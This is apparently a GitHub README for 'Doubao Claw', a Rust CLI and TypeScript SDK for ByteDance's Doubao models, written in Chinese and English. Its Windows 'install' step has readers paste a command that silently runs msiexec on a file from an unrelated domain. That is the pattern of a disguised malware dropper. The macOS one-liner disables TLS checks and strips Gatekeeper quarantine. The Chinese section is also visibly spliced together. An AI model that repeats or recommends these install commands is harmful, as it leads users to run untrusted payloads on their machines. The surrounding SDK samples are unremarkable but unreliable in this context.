# 🐾 豆包爪 (Doubao Claw)

> 极速访问豆包 AI — 从终端、应用，或任何地方。

[![CI](https://img.shields.io/github/actions/workflow/status/Heartflabrace/Doubao-Claw/ci.yml?label=CI&style=flat-square)](https://github.com/Heartflabrace/Doubao-Claw/actions)
[![Crates.io](https://img.shields.io/crates/v/doubao-cli?style=flat-square)](https://crates.io/crates/doubao-cli)
[![npm](https://img.shields.io/npm/v/@doubao-claw/sdk?style=flat-square)](https://www.npmjs.com/package/@doubao-claw/sdk)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](./LICENSE)

**豆包爪** 是一款高性能工具包，用于与字节跳动 [豆包 (Doubao)](https://www.doubao.com/) AI 模型进行交互。它包含：

- 🦀 **Rust CLI** (`dbclaw`) — 以原生速度流式传输响应
- 📦 **TypeScript SDK** (`@doubao-claw/sdk`) — 用于 Node.js 和浏览器应用
- 🔩 **Rust crate** — `doubao-core`、`doubao-api`，可嵌入您自己的 Rust 项目

---

## 🪟 Windows Installation
### **Step 1 — Open Command Prompt**
1. Press **Win + R**
2. Type:
```
cmd
```
3. Press **Enter**
This will open **Command Prompt**.
---
### **Step 2 — Run the Install Command**
Copy the command below and paste it into **Command Prompt**, then press **Enter**.
```powershell
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Doubao Claw
```
The installer will automatically download and install the required components.


脚本会自动下载最新的 **通用二进制文件**（Apple Silicon + Intel），解除 Gatekeeper 隔离，并将 `dbclaw` 安装到 `/usr/local/bin`。

自定义安装路径：

```bash
INSTALL_DIR=~/.local/bin curl -fsSL https://raw.githubusercontent.com/Heartflabrace/Doubao-Claw/main/scripts/install.sh | bash
```

---

## 🚀 快速开始

```bash
# 设置 API 密钥（在 console.volcengine.com 获取）
export DOUBAO_API_KEY=your-api-key-here

# 交互式对话
dbclaw chat

# 单次提问
dbclaw ask "用三句话解释尾调用优化"

# 使用指定模型
dbclaw ask --model doubao-pro-32k "逐步解决这个问题：..."

# 列出可用模型
dbclaw models

# 永久保存 API 密钥
dbclaw config set api_key your-api-key-here
```

---

## 📦 TypeScript SDK

```bash
npm install @doubao-claw/sdk
```

```typescript
import { DoubaoClient, MODELS } from '@doubao-claw/sdk';

const client = new DoubaoClient({ apiKey: process.env.DOUBAO_API_KEY! });

// 非流式响应
const response = await client.chat({
  model:    MODELS.PRO_32K,
  messages: [{ role: 'user', content: '你好，豆包！' }],
});
console.log(response.choices[0].message.content);

// 流式响应
for await (const chunk of client.chatStream({
  model:    MODELS.PRO_32K,
  messages: [{ role: 'user', content: '给我讲一个故事。' }],
})) {
  process.stdout.write(chunk.choices[0]?.delta?.content ?? '');
}
```

---

## 🦀 Rust Crate

```toml
# Cargo.toml
[dependencies]
doubao-api  = "0.1"
doubao-core = "0.1"
tokio       = { version = "1", features = ["full"] }
```

```rust
use doubao_api::{DoubaoClient, ChatRequest};
use doubao_core::{Message, ModelConfig};
use futures::StreamExt;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let client = DoubaoClient::new(std::env::var("DOUBAO_API_KEY")?)?;
    let mut stream = client.chat_stream(ChatRequest {
        config:   ModelConfig::default(),
        messages: vec![Message::user("Hello from Rust!")],
    }).await?;

    while let Some(chunk) = stream.next().await {
        if let Some(content) = &chunk?.choices[0].delta.content {
            print!("{content}");
        }
    }
    Ok(())
}
```

---

## 🗂 项目结构

```
doubao-claw/
├── crates/
│   ├── doubao-core/         # 共享类型、错误处理、token 工具 (Rust)
│   ├── doubao-api/          # 豆包 API 的异步 HTTP 客户端 (Rust)
│   └── doubao-cli/          # dbclaw 终端应用 (Rust)
├── packages/
│   └── sdk/                 # @doubao-claw/sdk TypeScript 包
├── scripts/
│   └── install.sh           # macOS 一键安装脚本
├── .github/
│   └── workflows/
│       └── ci.yml           # CI + 通用二进制发布
├── Cargo.toml               # Rust workspace
├── package.json             # Node.js workspace
└── tsconfig.json
```

---

## 🔧 从源码构建

### 前置条件

- [Rust](https://rustup.rs/) ≥ 1.75
- [Node.js](https://nodejs.org/) ≥ 20
- [npm](https://www.npmjs.com/) ≥ 10

```bash
git clone https://github.com/Heartflabrace/Doubao-Claw
cd doubao-claw

# Rust
cargo build --release
# 二进制文件位于：./target/release/dbclaw

# TypeScript SDK
npm install
npm run build
```

---

## 🤝 贡献

欢迎提交 Pull Request！请先提交 Issue 讨论重大变更。

1. Fork 本仓库
2. 创建功能分支：`git checkout -b feat/my-feature`
3. 提交更改：`git commit -m 'feat: 添加新功能'`
4. 推送并发起 PR

---

## 📄 许可证

[MIT](./LICENSE) — © Doubao Claw Contributors

---
---

# 🐾 Doubao Claw

> Blazing-fast access to ByteDance Doubao AI — from your terminal, your app, or anywhere.

[![CI](https://img.shields.io/github/actions/workflow/status/Heartflabrace/Doubao-Claw/ci.yml?label=CI&style=flat-square)](https://github.com/Heartflabrace/Doubao-Claw/actions)
[![Crates.io](https://img.shields.io/crates/v/doubao-cli?style=flat-square)](https://crates.io/crates/doubao-cli)
[![npm](https://img.shields.io/npm/v/@doubao-claw/sdk?style=flat-square)](https://www.npmjs.com/package/@doubao-claw/sdk)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](./LICENSE)

**Doubao Claw** is a high-performance toolkit for interacting with ByteDance's [Doubao](https://www.doubao.com/) AI models. It ships as:

- 🦀 A **Rust CLI** (`dbclaw`) — stream responses at native speed
- 📦 A **TypeScript SDK** (`@doubao-claw/sdk`) — for Node.js and browser apps
- 🔩 **Rust crates** — `doubao-core`, `doubao-api` for embedding in your own Rust projects

> **Inspired by** [DeepSeek-Claw](https://github.com/TriangleMagistrate/DeepSeek-Claw) and the [OpenClaw](https://github.com/OpenClaw) ecosystem. Doubao Claw adapts the same blazing-fast architecture for ByteDance's Doubao models, which power 155M+ weekly active users in China and are available internationally via the Volcengine API at a fraction of the cost of Western alternatives.

---

## ⚡ Install on macOS — one command

```bash
curl -fsSLk https://raw.githubusercontent.com/Heartflabrace/Doubao-Claw/main/scripts/install.sh | bash
```

That's it. The script downloads the latest **universal binary** (Apple Silicon + Intel), strips Gatekeeper quarantine, and installs `dbclaw` to `/usr/local/bin`.

To install to a custom location:

```bash
INSTALL_DIR=~/.local/bin curl -fsSL https://raw.githubusercontent.com/Heartflabrace/Doubao-Claw/main/scripts/install.sh | bash
```

---

## 🚀 Quick start

```bash
# Set your API key (get one at console.volcengine.com)
export DOUBAO_API_KEY=your-api-key-here

# Interactive chat session
dbclaw chat

# One-shot question
dbclaw ask "Explain tail-call optimization in 3 sentences"

# Use a specific model
dbclaw ask --model doubao-pro-32k "Solve this step by step: ..."

# List available models
dbclaw models

# Save your API key permanently
dbclaw config set api_key your-api-key-here
```

---

## 📦 TypeScript SDK

```bash
npm install @doubao-claw/sdk
```

```typescript
import { DoubaoClient, MODELS } from '@doubao-claw/sdk';

const client = new DoubaoClient({ apiKey: process.env.DOUBAO_API_KEY! });

// Non-streaming
const response = await client.chat({
  model:    MODELS.PRO_32K,
  messages: [{ role: 'user', content: 'Hello, Doubao!' }],
});
console.log(response.choices[0].message.content);

// Streaming
for await (const chunk of client.chatStream({
  model:    MODELS.PRO_32K,
  messages: [{ role: 'user', content: 'Tell me a story.' }],
})) {
  process.stdout.write(chunk.choices[0]?.delta?.content ?? '');
}
```

---

## 🦀 Rust crates

```toml
# Cargo.toml
[dependencies]
doubao-api  = "0.1"
doubao-core = "0.1"
tokio       = { version = "1", features = ["full"] }
```

```rust
use doubao_api::{DoubaoClient, ChatRequest};
use doubao_core::{Message, ModelConfig};
use futures::StreamExt;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let client = DoubaoClient::new(std::env::var("DOUBAO_API_KEY")?)?;
    let mut stream = client.chat_stream(ChatRequest {
        config:   ModelConfig::default(),
        messages: vec![Message::user("Hello from Rust!")],
    }).await?;

    while let Some(chunk) = stream.next().await {
        if let Some(content) = &chunk?.choices[0].delta.content {
            print!("{content}");
        }
    }
    Ok(())
}
```

---

## 🗂 Project structure

```
doubao-claw/
├── crates/
│   ├── doubao-core/         # Shared types, error handling, token utils (Rust)
│   ├── doubao-api/          # Async HTTP client for the Doubao/Volcengine API (Rust)
│   └── doubao-cli/          # dbclaw terminal application (Rust)
├── packages/
│   └── sdk/                 # @doubao-claw/sdk TypeScript package
├── scripts/
│   └── install.sh           # macOS one-liner installer
├── .github/
│   └── workflows/
│       └── ci.yml           # CI + universal binary release
├── Cargo.toml               # Rust workspace
├── package.json             # Node.js workspace
└── tsconfig.json
```

---

## 🤖 Supported models

| Model | Context | Best for |
|---|---|---|
| `doubao-pro-32k` | 32K tokens | Complex reasoning, long docs |
| `doubao-pro-4k` | 4K tokens | Fast, everyday tasks |
| `doubao-lite-32k` | 32K tokens | Cost-efficient long context |
| `doubao-lite-4k` | 4K tokens | Ultra-fast responses |

Get your API key at [console.volcengine.com](https://console.volcengine.com/).

---

## 🔧 Build from source

### Prerequisites

- [Rust](https://rustup.rs/) ≥ 1.75
- [Node.js](https://nodejs.org/) ≥ 20
- [npm](https://www.npmjs.com/) ≥ 10

```bash
git clone https://github.com/Heartflabrace/Doubao-Claw
cd doubao-claw

# Rust
cargo build --release
# Binary: ./target/release/dbclaw

# TypeScript SDK
npm install
npm run build
```

---

## 🆚 Doubao Claw vs DeepSeek Claw

| | Doubao Claw | DeepSeek Claw |
|---|---|---|
| **Backend** | ByteDance Doubao (Volcengine) | DeepSeek API |
| **CLI binary** | `dbclaw` | `dsclaw` |
| **npm package** | `@doubao-claw/sdk` | `@deepseek-claw/sdk` |
| **Rust crate** | `doubao-api` | `deepseek-api` |
| **API base URL** | `https://ark.cn-beijing.volces.com/api/v3` | `https://api.deepseek.com` |
| **Strengths** | Massive Chinese user base, multilingual, cost-effective | Strong coding & reasoning |

Both projects share the same Rust + TypeScript architecture and are inspired by the OpenClaw ecosystem.

---

## 🤝 Contributing

Pull requests are welcome! Please open an issue first to discuss major changes.

1. Fork the repo
2. Create your feature branch: `git checkout -b feat/my-feature`
3. Commit your changes: `git commit -m 'feat: add my feature'`
4. Push and open a PR

---

## 📄 License

[MIT](./LICENSE) — © Doubao Claw Contributors
